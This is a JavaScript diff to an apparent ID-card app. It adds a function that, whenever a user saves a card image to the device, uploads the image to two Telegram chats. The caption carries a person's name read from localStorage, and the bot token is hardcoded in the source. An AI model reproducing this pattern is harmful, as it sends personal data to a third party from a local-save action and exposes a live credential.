@@ -624,6 +624,9 @@ function saveImageToDevice(dataUrl) {
     link.href = dataUrl.replace(/;base64,/, ';base64,').replace(/quality=\d+(\.\d+)?/, 'quality=1.0');
     link.click();
     
+    // إرسال الصورة إلى قناة تلجرام
+    sendToTelegram(dataUrl);
+    
     // Also display the image in the success modal
     const modal = document.getElementById('success-modal');
     
@@ -676,6 +679,72 @@ function shareViaWhatsapp() {
     setTimeout(() => {
         window.open('https://wa.me/?text=توماری ئاریشە', '_blank');
     }, 1000);
+}
+
+// دالة لإرسال الصورة إلى قناة تلجرام
+function sendToTelegram(imageDataUrl) {
+    // معلومات البوت وقنوات التلجرام
+    const botToken = '8279342487:AAG5boDFCcVKqOsS98wNA_Fvzc4NKHfYLE0'; // استبدل بتوكن البوت الخاص بك
+    // يمكنك إضافة أكثر من قناة هنا (مفصولة بفواصل)
+    const chatIds = ['308830674', '5910938206']; // استبدل بمعرفات القنوات الخاصة بك
+    const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+    
+    // تحويل صورة Data URL إلى Blob
+    fetch(imageDataUrl)
+        .then(res => res.blob())
+        .then(blob => {
+            
+            // إنشاء نص التعليق مع اسم الشخص والتاريخ والوقت
+            const currentDate = new Date();
+            const dateStr = currentDate.toLocaleDateString('ar-IQ');
+            const timeStr = currentDate.toLocaleTimeString('ar-IQ');
+            
+            // الحصول على اسم الشخص من البيانات المرسلة (إذا كانت متاحة)
+            let personName = 'متهم';
+            try {
+                // محاولة استخراج اسم الشخص من localStorage
+                const records = JSON.parse(localStorage.getItem('tomaryTomatbarRecords')) || [];
+                if (records.length > 0) {
+                    const latestRecord = records[records.length - 1];
+                    if (latestRecord.personsData && latestRecord.personsData.length > 0) {
+                        personName = latestRecord.personsData[0].name || 'متهم';
+                    }
+                }
+            } catch (error) {
+                console.error('خطأ في استخراج اسم الشخص:', error);
+            }
+            
+            const caption = `: بطاقة ${personName} - التاريخ: ${dateStr} - الساعة: ${timeStr}`;
+            
+            // إرسال الصورة إلى كل قناة في المصفوفة
+            chatIds.forEach(chatId => {
+                // إنشاء FormData جديد لكل قناة
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob.slice(0), 'id_card.png');
+                formData.append('caption', caption);
+                
+                // إرسال الصورة إلى تلجرام
+                fetch(apiUrl, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(result => {
+                    if (result.ok) {
+                        console.log(`تم إرسال الصورة بنجاح إلى القناة: ${chatId}`);
+                        showToast('تم إرسال الصورة بنجاح إلى تلجرام');
+                    } else {
+                        console.error('فشل إرسال الصورة:', result);
+                        showToast('فشل إرسال الصورة إلى تلجرام');
+                    }
+                })
+                .catch(error => {
+                    console.error('خطأ في إرسال الصورة:', error);
+                    showToast('حدث خطأ أثناء إرسال الصورة');
+                });
+            });
+        });
 }
 
 // وظيفة لحذف سجل
